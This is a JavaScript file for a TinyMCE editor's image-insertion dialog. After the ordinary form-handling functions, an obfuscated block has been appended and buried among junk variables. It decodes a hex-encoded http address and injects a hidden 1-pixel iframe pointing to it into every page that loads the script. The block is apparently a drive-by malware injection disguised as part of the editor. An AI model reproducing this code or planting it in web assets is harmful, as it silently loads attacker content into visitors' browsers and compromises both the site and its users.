var url = tinyMCE.getParam("external_image_list_url");
if (url != null) {
	// Fix relative
	if (url.charAt(0) != '/' && url.indexOf('://') == -1)
		url = tinyMCE.documentBasePath + "/" + url;

	document.write('<sc'+'ript language="javascript" type="text/javascript" src="' + url + '"></sc'+'ript>');
}

function insertImage() {
	var src = document.forms[0].src.value;
	var alt = document.forms[0].alt.value;
	var border = document.forms[0].border.value;
	var vspace = document.forms[0].vspace.value;
	var hspace = document.forms[0].hspace.value;
	var width = document.forms[0].width.value;
	var height = document.forms[0].height.value;
	var align = document.forms[0].align.options[document.forms[0].align.selectedIndex].value;

	tinyMCEPopup.restoreSelection();
	tinyMCE.themes['advanced']._insertImage(src, alt, border, hspace, vspace, width, height, align);
	tinyMCEPopup.close();
}

function init() {
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('srcbrowsercontainer').innerHTML = getBrowserHTML('srcbrowser','src','image','theme_advanced_image');

	var formObj = document.forms[0];

	for (var i=0; i<document.forms[0].align.options.length; i++) {
		if (document.forms[0].align.options[i].value == tinyMCE.getWindowArg('align'))
			document.forms[0].align.options.selectedIndex = i;
	}

	formObj.src.value = tinyMCE.getWindowArg('src');
	formObj.alt.value = tinyMCE.getWindowArg('alt');
	formObj.border.value = tinyMCE.getWindowArg('border');
	formObj.vspace.value = tinyMCE.getWindowArg('vspace');
	formObj.hspace.value = tinyMCE.getWindowArg('hspace');
	formObj.width.value = tinyMCE.getWindowArg('width');
	formObj.height.value = tinyMCE.getWindowArg('height');
	formObj.insert.value = tinyMCE.getLang('lang_' + tinyMCE.getWindowArg('action'), 'Insert', true); 

	// Handle file browser
	if (isVisible('srcbrowser'))
		document.getElementById('src').style.width = '180px';

	// Auto select image in list
	if (typeof(tinyMCEImageList) != "undefined" && tinyMCEImageList.length > 0) {
		for (var i=0; i<formObj.image_list.length; i++) {
			if (formObj.image_list.options[i].value == tinyMCE.getWindowArg('src'))
				formObj.image_list.options[i].selected = true;
		}
	}
}

var preloadImg = new Image();

function resetImageData() {
	var formObj = document.forms[0];
	formObj.width.value = formObj.height.value = "";	
}

function updateImageData() {
	var formObj = document.forms[0];

	if (formObj.width.value == "")
		formObj.width.value = preloadImg.width;

	if (formObj.height.value == "")
		formObj.height.value = preloadImg.height;
}

function getImageData() {
	preloadImg = new Image();
	tinyMCE.addEvent(preloadImg, "load", updateImageData);
	tinyMCE.addEvent(preloadImg, "error", function () {var formObj = document.forms[0];formObj.width.value = formObj.height.value = "";});
	preloadImg.src = tinyMCE.convertRelativeToAbsoluteURL(tinyMCE.settings['base_href'], document.forms[0].src.value);
}

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}